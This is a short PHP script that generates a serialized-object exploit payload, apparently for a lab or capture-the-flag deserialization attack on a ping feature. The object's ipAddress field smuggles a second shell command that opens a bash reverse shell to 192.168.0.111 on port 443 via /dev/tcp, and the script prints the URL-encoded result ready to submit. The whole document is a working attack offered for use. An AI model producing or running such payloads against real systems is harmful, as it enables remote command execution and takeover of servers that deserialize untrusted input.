<?php

class pingTest {
        public $ipAddress = "; bash -c 'bash -i >& /dev/tcp/192.168.0.111/443 0>&1'";
        public $isValid = True;
        public $output = "";

}

echo urlencode(serialize(new pingTest));
